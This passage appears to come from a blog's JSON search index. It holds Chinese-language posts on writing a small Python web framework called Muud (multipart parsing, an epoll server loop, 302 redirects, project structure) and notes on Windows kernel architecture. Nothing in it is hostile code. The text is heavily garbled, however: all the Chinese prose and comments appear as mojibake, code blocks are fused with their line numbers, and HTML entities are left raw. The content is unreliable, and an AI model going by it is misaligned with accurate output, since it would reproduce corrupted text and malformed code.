self.raw_data[pre_len:] self.cur_len = len(raw_data) self.data=&#123;&quot;name&quot;:&quot;&quot;, &quot;filename&quot;:&quot;&quot;, &quot;file&quot;:b&quot;&quot;, &quot;len&quot;:0&#125; boundary = b&quot;--&quot; + r_boundary.search(self.raw_data).group(1) file_info = raw_data.split(boundary)[1].split(b&quot;\\r\\n&quot;)[1] for attribute in file_info.split(b&quot;; &quot;): # è·å¾—åå­— if b&quot;name&quot; in attribute and b&quot;=&quot; in attribute and not attribute.lower().startswith(b&quot;content&quot;): if attribute.split(b&quot;=&quot;)[0] == b&quot;name&quot;: self.data[&quot;name&quot;] = b&quot;&quot;.join(attribute.split(b&quot;=&quot;)[1:])[1:-1].decode() elif attribute.split(b&quot;=&quot;)[0] == b&quot;filename&quot;: # è·å¾—åŸå§‹æ–‡ä»¶å self.data[&quot;filename&quot;] = b&quot;&quot;.join(attribute.split(b&quot;=&quot;)[1:])[1:-1].decode() file_type = raw_data.split(boundary)[1].split(b&quot;\\r\\n&quot;)[2] pre_len = len(file_info) + len(file_type) + 2*4 #å‰ç½®é•¿åº¦ self.data[&quot;file&quot;] = self.raw_data.split(boundary)[1][pre_len:-2] self.data[&quot;len&quot;] = len(self.data[&quot;file&quot;]) ç”±äºä½¿ç”¨äº†epollæ¨¡å‹ï¼Œå½“ä¸Šä¼ çš„æ•°æ®é•¿åº¦å°äºæ€»é•¿åº¦æ—¶ç»§ç»­ä¸Šä¼ ï¼Œå®Œæˆåå†è¿›è¡Œå¤„ç†ï¼Œé‚£ä¹ˆserverå°±ä¼šæœ‰å¦‚ä¸‹ä¿®æ”¹ æ•°æ®å¯è¯»æ—¶ç»§ç»­è¯»å–å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„æ•°æ® 12345678elif event &amp; select.EPOLLIN: # æœ‰æ•°æ®å¯è¯» try: data = b&quot;&quot; data = connections[fileno].recv(1024*1024*10) # print(&quot;data from server\\n&quot;,data) if data: requests[fileno] += data ç”±äºæˆ‘çš„epollå¯¹æ¯ä¸ªå‘é€è¿‡æ¥çš„packageéƒ½æœ‰ä¸€ä¸ªresponseï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ 123456789101112131415161718192021# å¤„ç†è¯·æ±‚å¹¶ç”Ÿæˆå“åº”for fileno, data in requests.items(): if b&quot;HTTP&quot; in data or b&quot;http&quot; in data: # è§£æè¯·æ±‚å¤´éƒ¨ http = HTTPRequest(data=data, fileno=fileno, connections=connections) if http.cur_len &lt; http.length: pass else: http.show() http_route = HTTPRouter(http) response = http_route.route() responses[fileno] = response connections[fileno].send(response) # æ„é€ å“åº”å¤´éƒ¨å’Œå†…å®¹ # æ¸…ç©ºè¯·æ±‚ç¼“å†²åŒº response = b&#x27;&#x27; data = b&#x27;&#x27; requests[fileno] = b&#x27;&#x27; ç„¶åæµ‹è¯•äº†ä¸‹æ•ˆç‡ï¼Œé¢å¯¹å°æ–‡ä»¶çš„æ—¶å€™æ•ˆç‡è¿˜è¯´å¾—è¿‡å»ï¼ˆ&lt;10MBï¼‰ï¼Œå¤§æ–‡ä»¶çš„è¯åˆæ˜¯ä½¿ç”¨çš„æ˜¯å¯¹åº”fdçš„dataè¿›è¡Œæ‹¼æ¥ï¼Œå¢å¤§äº†å†…å­˜å¼€é”€å’ŒCPUå¼€é”€ï¼ˆä¸çŸ¥é“ä½¿ç”¨cçš„æŒ‡é’ˆä¼šä¸ä¼šå¿«ä¸€äº›ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯åç»­éœ€è¦ä¼˜åŒ–çš„ä¸œè¥¿ æ›´å¤§çš„æ–‡ä»¶åé¢ä¼šå‡ºç°æŒ‡æ•°çº§ä¸‹é™ï¼Œä¸è¿‡è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºæ¥åŸºäºTCPçš„æ‹¥å¡æ§åˆ¶ï¼Œå•æ¬¡å‘åŒ…æœ€å¤§ä¸º128kbï¼Œåˆ†å—ä¼ è¾“ï¼Œåç»­å¯ä»¥é’ˆå¯¹è¿™äº›ç‰¹æ€§è¿›è¡Œæ”¹è¿›ã€‚ 6-6 é‡å®šå‘ 12345@http_apidef redirect(http_request): data= &quot;http://www.qq.com&quot; result = Response(reply=data,type=&quot;text&quot;,status_code=302) return result.consum() ä¸»è¦å°±æ˜¯é€šè¿‡302è·³è½¬è¿›è¡Œé‡å®šå‘ï¼Œç„¶ååœ¨è¿”å›æŠ¥æ–‡å“ªé‡Œè®¾ç½®äº†å‡ ä¸ªæ–°çš„å‚æ•° 12345678910111213141516171819202122def consum(self) -&gt; bytes: result = &quot;&quot; if self.status_code == 302: result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\nLocation: &#123;location&#125;\\r\\n\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code], location=self.reply) else: result += &quot;HTTP/1.1 &#123;status_code&#125; &#123;msg&#125;\\r\\n&quot;.format( status_code=self.status_code, msg=status_code_dict[self.status_code]) result += &quot;Content-Type: &#123;type&#125;\\r\\n&quot;.format( type = self.content_type) result += &quot;Content-Length: &#123;length&#125;\\r\\n&quot;.format( length=self.length) result += &quot;\\r\\n&quot; result = result.encode() if self.status_code == 302: pass else: if type(self.reply) == bytes: result += self.reply else: result += self.reply.encode() return result ä¹‹åå¯ä»¥åœ¨utilsé‡Œé¢æ‰“åŒ…è¿™äº›æ–¹æ³•ï¼Œæˆ‘è¿™é‡Œæ”¾åœ¨http_responseä¸‹é¢ 12345# é‡å®šå‘def redirect(http_url): data= str(http_url) result = Response(reply=data,type=&quot;text&quot;,status_code=302) return result.consum()","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"}]},{"title":"ã€Muudå¼€å‘ã€‘1.åŸºç¡€ç»“æ„è§£æ","slug":"web-0x1","date":"2023-05-31T17:43:18.000Z","updated":"2023-06-01T14:31:23.538Z","comments":true,"path":"2023/06/01/web-0x1/","link":"","permalink":"https://joe1sn.eu.org/2023/06/01/web-0x1/","excerpt":"ä»0åˆ°1å¼€å‘ä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„python webâ€œæ¡†æ¶â€ é¡¹ç›®åœ°å€ï¼šhttps://github.com/Joe1sn/muud","text":"ä»0åˆ°1å¼€å‘ä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„python webâ€œæ¡†æ¶â€ é¡¹ç›®åœ°å€ï¼šhttps://github.com/Joe1sn/muud ç®€å•ä»‹ç» â€‹ åœ¨æ¯•ä¸šè®¾è®¡çš„æ—¶å€™ï¼Œåˆå§‹é€‰é¢˜ä¸ºã€ŠåŸºäºXMPPçš„å³æ—¶é€šè®¯ç³»ç»Ÿã€‹ï¼Œæƒ³çš„æ˜¯è‡ªå·±ç…§ç€RFCå†™ä¸€éXMPPåè®®ï¼Œä½†æ˜¯æ—¶é—´ä¸å¤Ÿï¼ˆæ¯•ç«Ÿè¦ä¸Šç­ï¼‰ã€‚æ‰€ä»¥æŠŠåºŸæ¡ˆå†åˆ©ç”¨ï¼ŒæŠ½å‡ºå…¶ä¸­çš„ä¸€äº›éƒ¨åˆ†ï¼Œä»Socketåˆ°webæ¡†æ¶ï¼Œå®ç°ä¸€ä¸ªç®€å•çš„CURDåŠŸèƒ½ï¼Œé”»ç‚¼ä¸€ä¸‹è‡ªå·±çš„æ–‡æ¡£åŒ–ç¼–ç¨‹èƒ½åŠ›ã€‚å—æˆ‘ä¸ªäººèƒ½åŠ›æœ‰é™ä¼šéšæ—¶æ–­æ›´ï¼Œä¸€è·¯ä¸Šåªæœ‰vscodeå’ŒchatGPTä»¥åŠæ‰€éœ€è¦çš„RFCæ–‡æ¡£ã€‚ â€‹ å†è¯´è¯´å·²å®ç°çš„éƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯ç¡®å®šåœ¨Linuxä¸Šè¿è¡Œçš„ï¼Œä½¿ç”¨pythonè¯­è¨€ ä½¿ç”¨epollæ¨¡å‹å®Œæˆäº†éƒ¨åˆ†HTTPæœåŠ¡å™¨çš„åŠŸèƒ½ sqlalchemyå®Œæˆäº†æ•°æ®åº“çš„ORMå®ç° è·¯ç”±é€šè¿‡é—­åŒ…å®Œæˆ è§†å›¾éƒ¨åˆ†ç¼–å†™ï¼ˆåªè€ƒè™‘JSONä¼ é€’ï¼‰ å¯åŠ¨éƒ¨åˆ†å‚è€ƒäº†Djangoçš„è®¾è®¡ æœ€åè¿è¡Œçš„æ•ˆæœ éœ€æ±‚åˆ†æ æ ¹æ®ChatGPTï¼Œä¸€ä¸ªå…¸å‹çš„Python Webæ¡†æ¶é€šå¸¸ç”±ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒç»„ä»¶ç»„æˆï¼š è·¯ç”±ï¼ˆRoutingï¼‰ï¼šè·¯ç”±ç”¨äºå°†ä¼ å…¥çš„HTTPè¯·æ±‚æ˜ å°„åˆ°ç›¸åº”çš„å¤„ç†ç¨‹åºæˆ–è§†å›¾å‡½æ•°ä¸Šã€‚å®ƒç¡®å®šäº†ä¸åŒURLè·¯å¾„ä¸åº”ç”¨ç¨‹åºä¸­çš„ä¸åŒåŠŸèƒ½ç‚¹ä¹‹é—´çš„å…³è”å…³ç³»ã€‚ è§†å›¾ï¼ˆViewsï¼‰ï¼šè§†å›¾æ˜¯å¤„ç†HTTPè¯·æ±‚å¹¶ç”ŸæˆHTTPå“åº”çš„å‡½æ•°æˆ–æ–¹æ³•ã€‚å®ƒä»¬æ¥æ”¶æ¥è‡ªè·¯ç”±çš„è¯·æ±‚å¹¶æ‰§è¡Œç›¸åº”çš„é€»è¾‘ï¼Œæœ€åè¿”å›å“åº”ç»™å®¢æˆ·ç«¯ã€‚ æ¨¡æ¿å¼•æ“ï¼ˆTemplate Engineï¼‰ï¼šæ¨¡æ¿å¼•æ“å…è®¸å¼€å‘è€…å°†é™æ€æ¨¡æ¿å’ŒåŠ¨æ€æ•°æ®ç»“åˆï¼Œç”Ÿæˆæœ€ç»ˆçš„HTMLå“åº”ã€‚æ¨¡æ¿å¼•æ“é€šå¸¸æ”¯æŒæ¨¡æ¿è¯­æ³•ã€å˜é‡æ›¿æ¢ã€æ¡ä»¶åˆ¤æ–­ã€å¾ªç¯ç­‰åŠŸèƒ½ï¼Œä»¥ç®€åŒ–åŠ¨æ€å†…å®¹çš„ç”Ÿæˆã€‚ ä¸­é—´ä»¶ï¼ˆMiddlewareï¼‰ï¼šä¸­é—´ä»¶æ˜¯ä½äºè¯·æ±‚å’Œè§†å›¾ä¹‹é—´çš„ç»„ä»¶ï¼Œç”¨äºåœ¨è¯·æ±‚åˆ°è¾¾è§†å›¾ä¹‹å‰æˆ–å“åº”è¿”å›å®¢æˆ·ç«¯ä¹‹å‰æ‰§è¡Œä¸€äº›é€šç”¨çš„åŠŸèƒ½ã€‚ä¸­é—´ä»¶å¯ä»¥å¤„ç†èº«ä»½éªŒè¯ã€è¯·æ±‚é¢„å¤„ç†ã€é”™è¯¯å¤„ç†ç­‰ä»»åŠ¡ã€‚ æ•°æ®åº“è®¿é—®ï¼ˆDatabase Accessï¼‰ï¼šWebæ¡†æ¶é€šå¸¸æä¾›äº†å¯¹æ•°æ®åº“çš„æ”¯æŒï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºå¯ä»¥ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ã€‚è¿™åŒ…æ‹¬è¿æ¥æ•°æ®åº“ã€æ‰§è¡ŒæŸ¥è¯¢å’Œæ“ä½œã€ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰ç­‰åŠŸèƒ½ã€‚ è¡¨å•å¤„ç†ï¼ˆForm Handlingï¼‰ï¼šWebåº”ç”¨ç¨‹åºé€šå¸¸éœ€è¦å¤„ç†ç”¨æˆ·æäº¤çš„è¡¨å•æ•°æ®ã€‚æ¡†æ¶æä¾›äº†è¡¨å•éªŒè¯ã€æ•°æ®ç»‘å®šã€é”™è¯¯å¤„ç†ç­‰åŠŸèƒ½ï¼Œä½¿å¼€å‘è€…å¯ä»¥æ–¹ä¾¿åœ°å¤„ç†è¡¨å•æ•°æ®ã€‚ èº«ä»½éªŒè¯ä¸æˆæƒï¼ˆAuthentication and Authorizationï¼‰ï¼šèº«ä»½éªŒè¯ç”¨äºéªŒè¯ç”¨æˆ·çš„èº«ä»½ï¼Œè€Œæˆæƒåˆ™ç”¨äºç¡®å®šç”¨æˆ·æ˜¯å¦æœ‰æƒé™æ‰§è¡Œç‰¹å®šæ“ä½œã€‚æ¡†æ¶é€šå¸¸æä¾›äº†èº«ä»½éªŒè¯å’Œæˆæƒçš„æ”¯æŒï¼Œä»¥ä¾¿å¼€å‘è€…å¯ä»¥è½»æ¾å®ç°ç”¨æˆ·è®¤è¯å’ŒæˆæƒåŠŸèƒ½ã€‚ æµ‹è¯•æ¡†æ¶ï¼ˆTesting Frameworkï¼‰ï¼šæµ‹è¯•æ¡†æ¶ç”¨äºç¼–å†™å’Œæ‰§è¡Œè‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä»¥ç¡®ä¿åº”ç”¨ç¨‹åºçš„æ­£ç¡®æ€§å’Œç¨³å®šæ€§ã€‚å®ƒæä¾›äº†æµ‹è¯•ç”¨ä¾‹çš„ç¼–å†™ã€è¿è¡Œå’Œæ–­è¨€ç­‰åŠŸèƒ½ã€‚ åæ¥çš„é¡¹ç›®åƒå‚è€ƒDjangoçš„è®¾è®¡ ç›®å‰é¡¹ç›®ç¼ºå°‘çš„ï¼š æ¨¡æ¿æ¸²æŸ“ï¼šè®¾è®¡çš„æ—¶å€™è€ƒè™‘åˆ°å‰åç«¯åˆ†ç¦»æ˜¯å¼€å‘ï¼Œæ²¡æœ‰æƒ³è¿‡æ¸²æŸ“ ä¸­é—´ä»¶ï¼šå®Œå…¨æ²¡æœ‰è®¾è®¡ è¡¨å•å¤„ç†ï¼šå®Œå…¨æ²¡æœ‰è®¾è®¡ æµ‹è¯•æ¡†æ¶ï¼šè¿˜åœ¨å­¦ å¯¹äºDjangoè¿™æ ·çš„æ¡†æ¶æ¥è¯´ï¼Œå¼€å¯ä¸€ä¸ªé¡¹ç›®åï¼Œ 123456789101112131415161718.â”œâ”€â”€ å¼€å¯çš„appåç§°â”‚ â”œâ”€â”€ admin.pyâ”‚ â”œâ”€â”€ apps.pyâ”‚ â”œâ”€â”€ __init__.pyâ”‚ â”œâ”€â”€ migrationsâ”‚ â”œâ”€â”€ models.pyâ”‚ â”œâ”€â”€ tests.pyâ”‚ â””â”€â”€ views.pyâ”œâ”€â”€ é¡¹ç›®åç§°â”‚ â”œâ”€â”€ asgi.pyâ”‚ â”œâ”€â”€ __init__.pyâ”‚ â”œâ”€â”€ settings.pyâ”‚ â”œâ”€â”€ urls.pyâ”‚ â””â”€â”€ wsgi.pyâ”œâ”€â”€ manage.pyâ”œâ”€â”€ staticâ””â”€â”€ templates views.pyæ˜¯è§†å›¾ã€models.pyæ˜¯ORMå¯¹è±¡ã€asgi.py\\wsgi.pyæ˜¯HTTPæœåŠ¡ã€setting.pyæ˜¯è®¾ç½®ã€url.pyæ˜¯è·¯ç”±ï¼Œé¡¹ç›®ä»manage,pyå¼€å§‹ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ•´ç†ä¸€ä¸‹åŸæ¥çš„ä»£ç äº†ã€‚ é‚£ä¹ˆç›®å‰é¡¹ç›®çš„ç»“æ„ 1234567891011121314151617181920212223â”œâ”€â”€ configâ”‚ â”œâ”€â”€ client.confâ”‚ â”œâ”€â”€ database.conf â”‚ â”œâ”€â”€ server.confâ”‚ â”œâ”€â”€ server.crtâ”‚ â”œâ”€â”€ server.csrâ”‚ â””â”€â”€ server.keyâ”œâ”€â”€ manage.pyâ”œâ”€â”€ README.mdâ”œâ”€â”€ requirements.txtâ”œâ”€â”€ rprint.pyâ”œâ”€â”€ serverâ”‚ â”œâ”€â”€ db.pyâ”‚ â”œâ”€â”€ models.py â”‚ â”œâ”€â”€ serialization.pyâ”‚ â”œâ”€â”€ server.pyâ”‚ â”œâ”€â”€ urls.pyâ”‚ â”œâ”€â”€ utilsâ”‚ â”‚ â”œâ”€â”€ autoreload.pyâ”‚ â”‚ â”œâ”€â”€ epollcontrol.pyâ”‚ â”‚ â”œâ”€â”€ functional.pyâ”‚ â””â”€â”€ views.pyâ””â”€â”€ test config åŒ…å«æ•°æ®åº“é…ç½®(database.conf)ï¼ŒSSLä½¿ç”¨çš„è¯ä¹¦(server.csr)å’Œkey(server.key)ï¼ŒsocketæœåŠ¡é…ç½®(server.conf) utils ä¸€äº›å¸®åŠ©æ¨¡å— server ä¸»è¦åŠŸèƒ½å®ç°ï¼ŒåŒ…æ‹¬è·¯ç”±ã€epollç®¡ç†ã€æ•°æ®åº“ç›¸å…³ï¼Œå…¶ä¸­views.pyå¯ä»¥ç¼–å†™apiï¼Œurls.pyä¸­è®¾ç½®è·¯ç”± test ä¸€äº›æµ‹è¯•ç”¨ä¾‹ ç›®å‰åº”è¯¥ä¸“æ³¨äºç¬¬ä¸€å—ï¼šä¼˜åŒ–epollæ€§èƒ½ä»¥åŠwsgiã€asgiçš„å®ç°ã€‚","categories":[{"name":"program","slug":"program","permalink":"https://joe1sn.eu.org/categories/program/"}],"tags":[{"name":"muud","slug":"muud","permalink":"https://joe1sn.eu.org/tags/muud/"},{"name":"web framework","slug":"web-framework","permalink":"https://joe1sn.eu.org/tags/web-framework/"}]},{"title":"ã€winå†…æ ¸åŸç†ä¸å®ç°ã€‘I. Windowsç³»ç»Ÿç»“æ„","slug":"windows-kernel-1-baisc","date":"2023-05-24T03:28:39.000Z","updated":"2023-06-01T14:31:05.149Z","comments":true,"path":"2023/05/24/windows-kernel-1-baisc/","link":"","permalink":"https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/","excerpt":"Windowsç³»ç»Ÿç»“æ„è¿˜æœ‰å¼•å¯¼è¿‡ç¨‹","text":"Windowsç³»ç»Ÿç»“æ„è¿˜æœ‰å¼•å¯¼è¿‡ç¨‹ I.a å¤§è‡´ç»“æ„ windowså†…æ ¸æ˜¯ä»windows NTå†…æ ¸å‘å±•è¿‡æ¥çš„ï¼Œä»å¼€å§‹å°±å’Œç¡¬ä»¶çš„å‘å±•æ¯æ¯ç›¸å…³ã€‚ Windowsé‡‡ç”¨åŒæ¨¡å¼ï¼ˆdual modeï¼‰ç»“æ„æ¥ä¿æŠ¤æ“ä½œç³»ç»Ÿå†…æ ¸ä¸å—åº”ç”¨ç¨‹åºçš„é”™è¯¯è€Œå‡ºç°å´©æºƒ windowsçš„åŸå§‹è®¾è®¡æ˜¯ä¸€ä¸ªæ”¯æŒå¤šç¯å¢ƒå­ç³»ç»Ÿçš„osï¼Œå®ƒè¿˜æ”¯æŒPOSIXå’ŒOS/2ç¯å¢ƒå­ç³»ç»Ÿ.ä¸ºä»–ä»¬æä¾›ä»¿çœŸæ‰§è¡Œç¯å¢ƒ I.b windowså†…æ ¸ç»„æˆç»“æ„ å…³äºå‡½æ•°çš„å¼€å¤´ ntï¼šå†…æ ¸æä¾›çš„æœåŠ¡ Ldrï¼šæ˜ åƒåŠ è½½å™¨å‡½æ•° Csrï¼šWindowså­è¿›ç¨‹é€šè®¯å‡½æ•° Dbgï¼šè°ƒè¯•å‡½æ•° Etwï¼šç³»ç»Ÿæ—¶é—´å‡½æ•° Rtlï¼šè¿è¡Œæ”¯æŒå‡½æ•° æ‰§è¡Œä½“APIå‡½æ•°æ¥æ”¶çš„å‚æ•°æ¥è‡ªå„ç§åº”ç”¨ç¨‹åºï¼Œé€šå¸¸ä¼šåœ¨ç¨‹åºçš„æœ€å¼€å§‹å¤„ï¼Œå¯¹æ‰€æ¥å—çš„å‚æ•°é€ä¸€æ¢æŸ¥ä»–ä»¬çš„å¯è®¿é—®æ€§ã€‚ II. windowså†…æ ¸å…³é”®ç»„ä»¶ HAL ç¡¬ä»¶æŠ½è±¡å±‚ HALé€šå¸¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åŠ¨æ€é“¾æ¥åº“ï¼Œwindowsè‡ªèº«æºå¸¦å¤šç§HALï¼Œä½†æ˜¯åœ¨ç³»ç»Ÿå®‰è£…çš„æ—¶å€™åªä¼šé€‰æ‹©ä¸€ç§ï¼Œæ”¹åä¸ºhal.dllã€‚æ¶‰åŠä¸­æ–­æ§åˆ¶å™¨ã€å•å¤„ç†å™¨/å¤šå¤„ç†å™¨ç¡¬ä»¶æ–­ç‚¹ã€‚ å†…æ ¸ï¼ˆå¾®å†…æ ¸ï¼‰ åœ¨å†…æ ¸æ¨¡å—ntoskrnl.exeä¸­çš„ä¸Šå±‚éƒ¨åˆ†ä¸ºæ‰§è¡Œä½“ï¼Œä¸‹å±‚æœ€æ¥è¿‘HALçš„å°±æ˜¯å†…æ ¸ã€‚è´Ÿè´£è¿›ç¨‹è°ƒåº¦ã€ä¸­æ–­å’Œå¼‚å¸¸å¤„ç†ï¼Œæ ¸å¿ƒä»»åŠ¡æ˜¯å°½å¯èƒ½è®©ç³»ç»Ÿä¸­çš„æ‰€æœ‰å¤„ç†å™¨å˜å¾—é«˜æ•ˆã€‚ windowså†…æ ¸ä½¿ç”¨æŠ¢å å¼è°ƒåº¦ï¼Œç”±äºé‡‡ç”¨é¢å‘å¯¹è±¡çš„è®¾è®¡ï¼Œä½¿å¾—å®ƒä¸»è¦é¢å‘ä¸¤ä¸ªå¯¹è±¡ï¼šåˆ†å‘å™¨ å’Œ æ§åˆ¶ ä¸¤ä¸ªå¯¹è±¡ åˆ†å‘å™¨å¯¹è±¡ï¼šå®ç°å„ç§åŒæ­¥åŠŸèƒ½ã€‚å½±å“çº¿ç¨‹è°ƒåº¦ï¼Œä¸»è¦ç”¨äº äº‹ä»¶(event) çªå˜ä½“(mutant) ä¿¡å·é‡(semaphore) è¿›ç¨‹(process) çº¿ç¨‹(thread) é˜Ÿåˆ—(query) é—¨(gate) å®šæ—¶å™¨(timer) æ§åˆ¶å¯¹è±¡ï¼šç”¨äºæ§åˆ¶å†…æ ¸çš„æ“ä½œï¼Œä¸å½±å“çº¿ç¨‹è°ƒåº¦ã€‚åŒ…æ‹¬ å¼‚æ­¥è°ƒç”¨(APC) å»¶è¿Ÿè¿‡ç¨‹è°ƒç”¨(DPC) ä¸­æ–­å¯¹è±¡ æ‰§è¡Œä½“ åœ¨å†…æ ¸æ¨¡å—ntoskrnl.exeä¸­çš„ä¸Šå±‚éƒ¨åˆ†ï¼ŒåŒ…å«5ç§ç±»å‹çš„å‡½æ•° è¢«å¯¼å‡ºçš„ã€å¯ä»¥åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹è°ƒç”¨çš„å‡½æ•°ã€‚ä½äº ntdll.dll ä¸­ã€‚ä¸€èˆ¬å°±æ˜¯win API æ²¡æœ‰è¢«å¯¼å‡ºã€å¯ä»¥åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹è°ƒç”¨çš„å‡½æ•°ã€‚æ¯”å¦‚å¸¸è§çš„åè°ƒè¯•å‡½æ•°ï¼ŒåŒ…æ‹¬å„ç§LRC(Local Process Callï¼Œæœ¬åœ°è°ƒç”¨è¿‡ç¨‹)ã€å„ç§æŸ¥è¯¢å‡½æ•°å’Œä¸“ä¸šå‡½æ•°ã€‚ åªèƒ½åœ¨å†…æ ¸æ¨¡å¼ä¸‹è°ƒç”¨çš„å¯¼å‡ºå‡½æ•°ã€‚åœ¨windows DDKä¸­æœ‰æ–‡æ¡£ã€‚ æ‰§è¡Œä½“ä¹‹é—´å†…éƒ¨è°ƒç”¨ï¼Œæœªè¢«æ–‡æ¡£åŒ–çš„å‡½æ•° ä¸€ä¸ªç»„ä»¶çš„å†…ç½®å‡½æ•° å…¶ä¸­ç»„ä»¶åŒ…æ‹¬ è¿›ç¨‹å’Œçº¿ç¨‹ç®¡ç†å™¨ï¼šè´Ÿè´£è¿›ç¨‹/çº¿ç¨‹çš„CURD å†…å­˜ç®¡ç†ï¼šè™šæ‹Ÿå†…å­˜ å®‰å…¨å¼•ç”¨ç›‘è§†å™¨ï¼ˆSRMï¼‰ï¼šç»´æŠ¤æœ¬åœ°è®¡ç®—æœºçš„å®‰å…¨ç­–ç•¥ I/Oç®¡ç†å™¨ ç¼“å­˜ç®¡ç†å™¨ï¼šå…è®¸ç£ç›˜å°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ é…ç½®ç®¡ç†å™¨ï¼šè´Ÿè´£æ³¨å†Œè¡¨çš„å®ç° å³æ’å³ç”¨ç®¡ç†å™¨ è¿˜æœ‰çš„å‡½æ•°è´Ÿè´£å¯¹æ‰§è¡Œä½“è¿›è¡Œç®¡ç† å¯¹è±¡ç®¡ç†å™¨ï¼šæ‰§è¡Œä½“å¯¹è±¡çš„CURD LPCè®¾æ–½ï¼šè´Ÿè´£åŒä¸€è®¾å¤‡çš„çš„å®¢æˆ·è¿›ç¨‹å’ŒæœåŠ¡è¿›ç¨‹çš„æ¶ˆæ¯ä¼ é€’ï¼Œå¯¹åº”çš„æ˜¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰ è¿è¡Œæ—¶åº“å‡½æ•° æ‰§è¡Œä½“æ”¯æŒä¾‹ç¨‹ï¼šå†…å­˜çš„åˆ†é…ã€äº’é”å†…å­˜çš„è½¬æ¢ è®¾å¤‡é©±åŠ¨ç¨‹åº é©±åŠ¨æ–‡ä»¶ï¼ˆ.sysï¼‰ï¼Œæ¼æ´æŒ–æ˜å­˜åœ¨äºIOCTL æ–‡ä»¶ç³»ç»Ÿ/å­˜å‚¨ç®¡ç† ä¸»è¦æ˜¯ntfs.sysã€‚æ¼æ´æŒ–æ˜å­˜åœ¨äºCLFSï¼ˆé€šç”¨æ—¥å¿—æ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚ ç½‘ç»œ windowså¥—æ¥å­—ã€winInetã€NetBIOSã€RPC III. windowså­ç³»ç»Ÿ åœ¨ä¸Šé¢çš„å†…æ ¸éƒ¨åˆ†å·²ç»å®ç°äº†å¯¹ç¡¬ä»¶çš„ç®€å•è®¿é—®æ§åˆ¶ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨æ¬¡åŸºç¡€ä¸Šè¿›è¡Œè·Ÿé«˜å±‚æ¬¡çš„å»ºè®¾ã€‚ åœ¨PEæ–‡ä»¶çš„å¤´éƒ¨åŸŸSubssytemä¸­æŒ‡å®šäº†è¯¥ç¨‹åºä¼šåœ¨é‚£ä¸ªå­ç¯å¢ƒä¸­è¿è¡Œã€‚ å­ç³»ç»Ÿä¹Ÿåˆ†ä¸ºç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼ï¼Œæ ¸å¿ƒéƒ¨åˆ†æ˜¯ win32k.sysã€‚å­ç³»ç»Ÿçš„DLLé“¾æ¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼ŒåŒ…æ‹¬kernel32.dll user32.dll gdi32.dll advapi.dllï¼Œè´Ÿè´£å®ç°æ–‡æ¡£åŒ–çš„windowså‡½æ•°ã€‚ win32k.sysåŒæ—¶ä¹Ÿè´Ÿè´£å‘å†…æ ¸æ³¨å…¥ä¸€ç³»åˆ—å‡ºè°ƒå‡½æ•°(callout)ï¼Œä¸€æ—¦è°ƒç”¨äº†win32k.sysçš„ä»»ä½•ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼Œè¿™ä¸ªç¨‹åºå°±ä¼šå˜æˆä¸€ä¸ªGDIçº¿ç¨‹ æ ¸å¿ƒåŠŸèƒ½å¯ä»¥åˆ†ä¸ºï¼š çª—å£ç®¡ç† ç”±windowså­è¿›ç¨‹csrss.exeè´Ÿè´£æ§åˆ¶å°çª—å£åŠŸèƒ½ 1234å­ç³»ç»Ÿä¼šè¯---&gt;äº¤äº’å¼çª—å£ç«™---&gt;é»˜è®¤æ¡Œé¢---&gt;é¡¶çº§çª—æˆ·å£åˆ—è¡¨-&gt;å­çª—å£ | |_&gt;ç™»å½•çª—å£ | |_&gt;å±å¹•ä¿æŠ¤çª—å£ |-&gt;éäº¤äº’å¼çª—å£--&gt;ä¸å¯è§æ¡Œé¢ å›¾å½¢è®¾å¤‡æ¥å£(GDI) ä¸»è¦æ˜¯å›¾å½¢æ”¯æŒï¼Œè®¾è®¡Direct3Dç­‰ IV. å®‰å…¨æ€§ç®¡ç† ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼šwinlogonã€SRM å’Œ lsass winlogon å’Œ lsass æ˜¯ä¸¤ä¸ªç”¨æˆ·æ¨¡å¼è¿›ç¨‹ï¼Œ è€Œ SRM æ˜¯ Windows æ‰§è¡Œä½“ä¸­çš„ç»„ä»¶ SRMï¼ˆSecurity Reference Monitorå®‰å…¨å¼•ç”¨ç›‘è§†å™¨ï¼‰ï¼Œè´Ÿè´£æ‰§è¡Œå¯¹è±¡çš„å®‰å…¨è®¿é—®æ£€æŸ¥ã€ç®¡ç†ç”¨æˆ·ç‰¹æƒã€ç”Ÿæˆå®‰ å…¨å®¡è®¡æ¶ˆæ¯ï¼Œå¹¶ä¸”å®šä¹‰äº†è®¿é—®ä»¤ç‰Œæ•°æ®ç»“æ„æ¥è¡¨ç¤ºä¸€ä¸ªå®‰å…¨ç¯å¢ƒã€‚ Winlogonï¼Œè´Ÿè´£å“åº” 